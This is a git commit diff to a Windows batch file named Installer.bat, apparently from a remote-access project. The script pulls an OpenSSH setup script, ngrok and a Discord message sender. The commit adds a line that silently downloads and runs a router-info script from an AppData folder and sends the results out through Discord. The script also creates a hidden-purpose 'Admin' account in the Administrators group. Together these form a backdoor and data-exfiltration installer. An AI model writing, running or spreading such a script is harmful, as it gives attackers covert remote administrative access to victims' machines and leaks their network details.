47d61abda24bdd417b17e874cc59844a2f892bc5
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-22 18:52:16 +0200

    Update Installer.bat

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -4,13 +4,11 @@ cd %temp%
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
-curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/installer.cmd -o installer.cmd
 
 set ""
 
-::installer.cmd
-::router>router.txt
-::Source.bat +silent --file %temp%/router.txt
+:: router info command
+curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & router>router.txt & Source.bat +silent --file %temp%/router.txt
 
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
